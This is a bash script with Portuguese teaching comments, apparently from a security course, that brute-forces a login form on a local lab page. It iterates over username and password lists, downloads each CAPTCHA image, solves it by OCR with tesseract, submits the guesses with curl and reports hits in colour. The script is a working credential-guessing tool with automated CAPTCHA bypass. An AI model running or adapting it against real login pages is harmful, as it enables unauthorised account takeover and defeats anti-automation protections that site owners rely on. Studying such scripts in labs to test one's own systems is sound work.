 
#!/bin/bash

USERS="./users.txt"
PASSWORDS="./passwords.txt"   # arquivos de texto com diversos nomes e senhas de usuários para serem automatizados

for USER in $(cat $USERS)
do
        for PASS in $(cat $PASSWORDS)
        do

                STATUS="Captcha incorreto"

                while [ "$STATUS" == "Captcha incorreto" ]
                do

                        curl -s "http://localhost/bruteforce4/captcha.php?l=150&a=50&tf=20&ql=5" -H 'Cookie: PHPSESSID=r8n9p20c0jtf8dob9ef787sqn7' --output image

                        # De início, tesseract image stdout trará o texto da imagem. Como comentamos anteriormente, esse processo tem uma margem de erro. Depois, precisamos arrumar a resposta entregue pelo Tesseract, tirando qualquer espaço ou "Enter" do texto resultado. Removeremos espaços desnecessários com tr -d " " e os "Enters" com xargs.
                        
                        CAPTCHA=$(tesseract image stdout | tr -d " " | xargs)

            
                        STATUS=$(curl -s 'http://localhost/bruteforce4/index.php' -H 'Cookie: PHPSESSID=r8n9p20c0jtf8dob9ef787sqn7' --data-raw "username=$USER&password=$PASS&captcha=$CAPTCHA" -L | egrep -o "<p style=\"color:red\" >.*</p>" | sed -r "s/.*>(.*)<.*/\1/g")

                        if [ "$STATUS" == "" ]
                        then                
                                COLOR='\033[0;32m'
                                NC='\033[0m' # No Color                                
                                STATUS="Sucesso"

                        elif [ "$STATUS" == "Captcha incorreto" ]
                        then
                                COLOR='\033[0;33m'
                                NC='\033[0m' # No Color
                        else
                                COLOR='\033[0;31m'                                 
                        fi
	
 				  # Usando o símbolo de cifrão, salvaremos a resposta desse comando na variável STATUS. Com curl, faremos uma requisição no index.php usando um cookie de sessão e enviaremos os dados que definimos ao longo do código (username=$USER, password=$PASS e captcha=$CAPTCHA). Em seguida, utilizaremos a expressão regular do vídeo anterior para separar o trecho no HTML referente à mensagem de erro em vermelho.
                        # Da linha 22 em diante, configuramos como cada tipo de retorno será exibido no terminal, para facilitar a leitura dos resultados dos testes. Quando obtermos STATUS="Sucesso", o texto aparecerá em verde. Quando o Tesseract falhar na interpretação do CAPTCHA e obtivermos STATUS=Captcha incorreto, o texto ficará amarelho. Caso o usuário ou a senha estiverem incorretos, a mensagem estará em vermelho.
                       
                        echo -e "${COLOR}User: $USER - Pass: $PASS - Status: $STATUS${NC}"        
                done        

        done
done 